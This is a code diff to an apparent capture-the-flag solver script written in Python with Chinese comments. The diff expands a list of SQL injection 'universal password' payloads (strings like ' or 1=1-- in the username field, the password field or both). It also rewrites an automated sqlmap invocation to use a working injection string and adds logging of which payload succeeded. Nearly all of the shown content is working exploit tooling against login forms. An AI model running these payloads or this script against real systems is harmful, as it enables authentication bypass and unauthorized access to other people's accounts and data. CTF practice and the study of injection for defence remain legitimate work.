@@ -66,11 +66,22 @@ class CTFSolver:
     async def test_universal_password(self):
         """测试万能密码注入"""
         payloads = [
+            # 用户名字段注入
             {"username": "admin'--", "password": ""},
             {"username": "admin'#", "password": ""},
             {"username": "admin' or 1=1#", "password": ""},
             {"username": "' or 1=1--", "password": ""},
             {"username": "' or '1'='1", "password": ""},
+            
+            # 密码字段注入
+            {"username": "admin", "password": "' or 1=1--"},
+            {"username": "admin", "password": "' or '1'='1"},
+            {"username": "test", "password": "' or 1=1--"},
+            {"username": "test", "password": "' or '1'='1"},
+            
+            # 双字段注入
+            {"username": "' or 1=1--", "password": "' or 1=1--"},
+            {"username": "admin' or '1'='1", "password": "test' or '1'='1"},
         ]
         
         for payload in payloads:
@@ -87,6 +98,7 @@ class CTFSolver:
                             "payload": payload,
                             "flag": flag,
                             "status": response.status,
+                            "response_length": len(text),
                             "response_text": text[:200] if len(text) > 200 else text
                         }
             except Exception as e:
@@ -105,6 +117,7 @@ class CTFSolver:
                             "payload": payload,
                             "flag": flag,
                             "status": response.status,
+                            "response_length": len(text),
                             "response_text": text[:200] if len(text) > 200 else text
                         }
             except Exception as e:
@@ -119,8 +132,8 @@ class CTFSolver:
         output_dir = "sqlmap_results"
         os.makedirs(output_dir, exist_ok=True)
         
-        # sqlmap命令
-        cmd = f"sqlmap -u \"{self.target_url}?username=test&password=test\" --batch --level=2 --risk=2"
+        # sqlmap命令 - 使用找到的有效payload
+        cmd = f"sqlmap -u \"{self.target_url}?username=admin&password=' or '1'='1\" --batch --level=2 --risk=2"
         
         try:
             print(f"   运行命令: {cmd[:80]}...")
@@ -226,7 +239,8 @@ class CTFSolver:
             if result and result.get("flag"):
                 self.flag = result["flag"]
                 print(f"   ✅ 找到flag: {self.flag}")
-                print(f"   ⚡ 利用方法: {result['payload']['username']} ({result['method']})")
+                print(f"   ⚡ 利用方法: username={result['payload']['username']}, password={result['payload']['password']} ({result['method']})")
+                print(f"   状态码: {result['status']}, 响应长度: {result['response_length']}")
             else:
                 print("   ❌ 未找到flag")
                 # 继续测试其他方法
@@ -261,6 +275,11 @@ class CTFSolver:
                 print(f"🎉 Flag: {self.flag}")
                 print(f"🔓 漏洞: SQL注入（万能密码）")
                 print(f"🎯 目标: {self.target_url}")
+                print(f"📋 详细信息:")
+                if result:
+                    print(f"   - 方法: {result['method']}")
+                    print(f"   - Payload: username={result['payload']['username']}, password={result['payload']['password']}")
+                    print(f"   - 响应长度: {result['response_length']} 字节")
             else:
                 print("❌ 未找到flag")
                 print("⚠️  可能原因:")
@@ -279,7 +298,12 @@ class CTFSolver:
             }
             
             if result:
-                final_result["exploit"] = f"{result.get('payload', {}).get('username', '')} ({result.get('method', '')})"
+                final_result["exploit"] = {
+                    "method": result.get('method', ''),
+                    "username": result.get('payload', {}).get('username', ''),
+                    "password": result.get('payload', {}).get('password', ''),
+                    "response_length": result.get('response_length', 0)
+                }
             
             output_file = "ctf_solution.json"
             with open(output_file, "w", encoding="utf-8") as f:
